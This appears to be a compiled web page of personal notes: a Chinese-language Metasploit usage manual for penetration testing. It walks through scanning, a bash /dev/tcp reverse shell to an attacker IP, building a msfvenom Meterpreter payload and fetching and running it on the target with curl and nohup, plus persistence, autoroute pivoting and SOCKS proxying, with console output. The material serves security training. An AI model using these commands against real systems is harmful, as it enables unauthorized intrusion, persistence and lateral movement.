import{_ as n}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as a,o as t,c as l,a as e,b as d,d as r,e as i}from"./app-VN37nR7B.js";const o="/DailyNotes/assets/1-ujtAWhLf.png",c="/DailyNotes/assets/2-lTLfMFxy.png",u="/DailyNotes/assets/3-d1mqeNbO.png",m="/DailyNotes/assets/4-Sl1o8UJg.png",v="/DailyNotes/assets/image-20230925113056003-NIURxYpo.png",p="/DailyNotes/assets/image-20230925113126188-YwaEl6UP.png",g={},b=i(`<h1 id="msf使用手册" tabindex="-1"><a class="header-anchor" href="#msf使用手册" aria-hidden="true">#</a> MSF使用手册</h1><h3 id="msf简介" tabindex="-1"><a class="header-anchor" href="#msf简介" aria-hidden="true">#</a> MSF简介</h3><p>Metasploit框架（Metasploit Framework, MSF）是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。</p><p>Metasploit通过控制台接口，你可以访问和使用所有Metasploit的插件，例如Payload、利用模块、 Post模块等。 Metasploit还有第三方程序的接口，例如Nmap、SQLMap 等，可以直接在控制台接口里使用。</p><h3 id="msf五大模块类型" tabindex="-1"><a class="header-anchor" href="#msf五大模块类型" aria-hidden="true">#</a> MSF五大模块类型</h3><ul><li>Auxiliaries（辅助模块） 该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</li><li>Exploit（漏洞利用模块） 漏洞利用是指由渗透测试者利用 一个系统、应用或者服务中的安全漏洞进行的攻击行为 。流行的渗透攻击技术包括缓冲区溢出、 Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码 。</li><li>Payload（攻击载荷模块） 攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入 。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等 。</li><li>Post（后期渗透模块） 该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</li><li>Encoders（编码工具模块） 该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、 IDS及类似的安全软件检测出来。</li></ul><h3 id="msf渗透攻击步骤" tabindex="-1"><a class="header-anchor" href="#msf渗透攻击步骤" aria-hidden="true">#</a> MSF渗透攻击步骤</h3><p>使用MSF渗透测试时，可以综合使用以上模块，对目标系统进行侦察并发动攻击，大致的步骤如下所示。</p><ol><li>扫描目标机系统，寻找可用漏洞。</li><li>选择并配置一个漏洞利用模块（exploit）。</li><li>选择并配置一个攻击载荷模块（payload）。</li><li>选择一个编码技术，用来绕过杀毒软件的查杀 。</li><li>渗透攻击。</li></ol><h3 id="msf启动、退出、更新" tabindex="-1"><a class="header-anchor" href="#msf启动、退出、更新" aria-hidden="true">#</a> MSF启动、退出、更新</h3><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msfconsole：启动MSF框架。
exit：退出MSF框架。也可以使用快捷键Ctrl+\\。
back：退出到上一级。
apt-get update ：同步 /etc/apt/sources.list 和 /etc/apt/sources.list.d 中列出的源的索引，这样才能获取到最新的软件包。 。
apt install metasploit-framework：更新msf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="主机扫描命令" tabindex="-1"><a class="header-anchor" href="#主机扫描命令" aria-hidden="true">#</a> 主机扫描命令</h3><p><strong>1. 使用辅助模块进行端口扫描</strong></p><p>辅助模块auxiliary是MSF的内置模块，首先利用<code>search portscan</code>命令查询一下有哪些可用的端口扫描模块:</p><figure><img src="`+o+'" alt="1" tabindex="0" loading="lazy"><figcaption>1</figcaption></figure><p>可以看到有8个可用的端口扫描模块，此处以tcp端口扫描模块为例进行扫描。输入命令<code>use auxiliary/scanner/portscan/tcp</code>进入对应模块（看&gt;号前面的内容就知道自己所处模块位置），再输入<code>show options</code>查询对应模块需要使用的参数。</p><figure><img src="'+c+'" alt="2" tabindex="0" loading="lazy"><figcaption>2</figcaption></figure><p>在上述参数中，<strong>Required</strong>列被标记为<strong>yes</strong>的参数必须包含实际的值，其中除了<strong>RHOSTS</strong>外，其余参数均有默认值。<strong>THREADS</strong>设置扫描线程数量，默认为1，数量越高扫描越快。使用<code>set</code>命令设置某个参数值，可以使用<code>unset</code>命令取消某个参数值的设置，设置完毕后使用<code>run</code>命令执行模块，可以看到扫描结果如下：</p><figure><img src="'+u+`" alt="3" tabindex="0" loading="lazy"><figcaption>3</figcaption></figure><p>其实还有两条可选命令：<code>setg</code>命令和<code>unsetg</code>命令 。二者用于在<strong>msfconsole</strong>中设置或者取消设置全局性的参数值，从而避免重复输入相同的值。例如可以全局设置<strong>LHOST</strong></p><p><strong>2. 使用辅助模块进行服务扫描</strong></p><p>在扫描目标机器上运行的服务时，有多种基于服务的扫描技术可供选择，例如VNC 、FTP 、SMB等，只需执行特定类型的扫描就可以发现服务。使用命令<code>search scanner</code>可以发现大量的扫描模块，约有600多个。</p><p><code>search _version</code> //扫描服务版本的各种模块</p><p><code>search _login</code> //查看所有服务登录口令探测模块</p><p><code>search scanner/**</code> //搜索与**服务相关的模块。</p><p>**Telnet服务扫描 **</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>search scanner/telnet
use auxiliary/scanner/telnet/telnet_login     //telent登录 
use auxiliary/scanner/telnet/telnet_version   //telent版本
set RHOSTS xxxx/24 
set THREADS 100 
run/exploit 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>SSH服务扫描</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>use auxiliary/scanner/ssh/ssh_login //ssh登录
use auxiliary/scanner/ssh/ssh_login_pubkey //ssh公共密钥认证登录
use auxiliary/scanner/ssh/ssh_version //扫描ssh版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+m+`" alt="4" tabindex="0" loading="lazy"><figcaption>4</figcaption></figure><p>Oracle数据库扫描</p><p>SMB服务扫描</p><p>MSSQL服务扫描</p><p>FTP扫描</p><p>SMTP扫描</p><p>SNMP扫描</p><p>MSF端口扫描</p><p><strong>wmap</strong> Web应用辅助扫描，漏洞查找等模块基本都在 modules/auxiliary/ 下， Metasploit内置了wmap WEB扫描器 要先创建一个数据库用来存放扫描数据，初始化wmap</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wmap_sites -a http://202.112.50.74 // 添加要扫描的网站
wmap_sites -l
wmap_targets -t http://202.112.20.74 // 把添加的网站作为扫描目标
wmap_run -t   // 查看那些模块将在扫描中使用
wmap_run -e   // 开始扫描
vulns     // 查看漏洞信息
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>3.使用 Nmap 扫描</strong></p><p>在MSF框架中可以直接使用Nmap，输入命令<code>nmap -A 192.168.1.7</code>对靶机进行全面扫描，</p><h3 id="msf权限维持" tabindex="-1"><a class="header-anchor" href="#msf权限维持" aria-hidden="true">#</a> MSF权限维持</h3><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>use exploit/windows/local/persistence_service
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="攻防演练msf的一些命令" tabindex="-1"><a class="header-anchor" href="#攻防演练msf的一些命令" aria-hidden="true">#</a> 攻防演练MSF的一些命令</h3><h4 id="msf管理shell" tabindex="-1"><a class="header-anchor" href="#msf管理shell" aria-hidden="true">#</a> MSF管理shell</h4><p>手动反弹shell</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 100.1.1.169
lhost =&gt; 100.1.1.169
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 100.1.1.169:4444
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后在已经拿到的靶机shell输入：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash -i &gt;&amp; /dev/tcp/100.1.1.169/4444 0&gt;&amp;1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后可以把权限修改为meterpreter（^Z表示ctrl+Z）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>root@web01:/home/mason# ^Z
Background session 1? [y/N]  y
msf6 exploit(multi/handler) &gt; use post/multi/manage/shell_to_meterpreter 
msf6 post(multi/manage/shell_to_meterpreter) &gt; set session 1
session =&gt; 1
msf6 post(multi/manage/shell_to_meterpreter) &gt; run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 100.1.1.169:4433 
[*] Sending stage (980808 bytes) to 192.168.0.51
[*] Meterpreter session 2 opened (100.1.1.169:4433 -&gt; 192.168.0.51:52976) at 2022-12-05 11:32:18 +0800
[*] Post module execution completed

msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 1
[*] Starting interaction with 1...

root@web01:/home/mason# 
root@web01:/home/mason# ^Z
Background session 1? [y/N]  y
msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 2
[*] Starting interaction with 2...

meterpreter &gt; 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看出session1是shell，session2是meterpreter。</p><h3 id="利用木马获得meterperter" tabindex="-1"><a class="header-anchor" href="#利用木马获得meterperter" aria-hidden="true">#</a> 利用木马获得meterperter</h3><p>为了防止ssh连接超时终端，可以上传后门文件并持续运行，生成木马命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msf5: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=100.1.1.169 LPORT=7777 -f elf &gt; mshell.elf
msf6: msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=100.1.1.169 LPORT=7777 -f elf &gt; mshell.elf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后起监听</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 100.1.1.169
set lport 7777
run
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传木马，这里选择在攻击机起http服务，然后靶机curl -o的方式</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>root@web01:/home/mason# curl http://100.1.1.169:8000/mshell.elf
Warning: Binary output can mess up your terminal. Use &quot;--output -&quot; to tell 
Warning: curl to output it to your terminal anyway, or consider &quot;--output 
Warning: &lt;FILE&gt;&quot; to save to a file.
root@web01:/home/mason# curl http://100.1.1.169:8000/mshell.elf -o mshell.elf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   250  100   250    0     0   8162      0 --:--:-- --:--:-- --:--:--  8333
root@web01:/home/mason# chmod 777 mshell.elf
root@web01:/home/mason# nohup ./mshell.elf &amp;
[1] 1863420
root@web01:/home/mason# nohup: ignoring input and appending output to &#39;nohup.out&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>重要的是<code>nohup ./mshell.elf &amp;</code>，持续运行。</p><p>msf的meterpreter有<code>upload</code>和<code>download</code>命令，可以上传或下载文件。</p><h3 id="msf添加路由和代理" tabindex="-1"><a class="header-anchor" href="#msf添加路由和代理" aria-hidden="true">#</a> MSF添加路由和代理</h3>`,62),h={href:"https://blog.csdn.net/m0_55793759/article/details/126514312",target:"_blank",rel:"noopener noreferrer"},x=i(`<p>跳板实现过程</p><p>（1）需要有一个已经获取的meterpreter会话；</p><p>（2）获取内网地址网段；</p><p>（3）在MSF平台上添加去往内网网段的路由。</p><h4 id="路由" tabindex="-1"><a class="header-anchor" href="#路由" aria-hidden="true">#</a> 路由</h4><p>在获取一个session会话后，获取目标内网相关信息</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>meterpreter &gt; run get_local_subnets

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 192.168.0.0/255.255.0.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>添加路由的方式1：路由添加到每个网段，动态路由</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>meterpreter &gt; run post/multi/manage/autoroute

[!] SESSION may not be compatible with this module.
[*] Running module against web01.blackops.local
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.168.0.0/255.255.0.0 from host&#39;s routing table.

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>添加路由的方式2：配置静态路由，即一次只添加一个网段路由</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>run autoroute –h //帮助命令查询
run autoroute -s 10.0.20.0/24 //静态路由添加
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>添加以后查看路由表</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>meterpreter &gt; run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.0.0        255.255.0.0        Session 3

meterpreter &gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="socks代理" tabindex="-1"><a class="header-anchor" href="#socks代理" aria-hidden="true">#</a> socks代理</h4><p>代理就是在我们的vps开启了一个socks代理，监听vps本地端口，然后再通过这个端口<code>将流量转给msf</code>，msf转发给路由，所以能将流量直接带入到内网中</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msf5: use auxiliary/server/socks4a    //或者   use auxiliary/server/socks5
msf6: use auxiliary/server/socks_proxy
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>先把session1挂起，回到meterpeter</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>use auxiliary/server/socks_proxy
set options
set SRVHOST 127.0.0.1
run
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后修改代理配置文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>vim /etc/proxychains4.conf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在[proxyLIst]下面添加（有多余的就注释掉）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>socks5 127.0.0.1 1080
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后就可以使用工具扫描了，只需要在命令前面加<code>proxychains4</code>就可以了，例如</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>proxychains4 ./fscan_amd64 -h 192.168.0.0/16 -np -no -nopoc
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="升级msf后一些warning" tabindex="-1"><a class="header-anchor" href="#升级msf后一些warning" aria-hidden="true">#</a> 升级MSF后一些warning</h3><p>升级MSF</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sudo su -
apt-get upgrade
apt-get update
apt install metasploit-framework   
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后启动</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>msfdb run
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>warning:</p><figure><img src="`+v+`" alt="image-20230925113056003" tabindex="0" loading="lazy"><figcaption>image-20230925113056003</figcaption></figure><p>处理办法</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sudo -u postgres psql -U postgres  -d msf REINDEX DATABASE msf;
ALTER DATABASE msf REFRESH COLLATION VERSION;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+p+'" alt="image-20230925113126188" tabindex="0" loading="lazy"><figcaption>image-20230925113126188</figcaption></figure>',34);function f(_,S){const s=a("ExternalLinkIcon");return t(),l("div",null,[b,e("p",null,[e("a",h,[d("论后渗透MSF之 | 添加路由和代理"),r(s)])]),x])}const w=n(g,[["render",f],["__file","MSFUse.html.vue"]]);export{w as default};
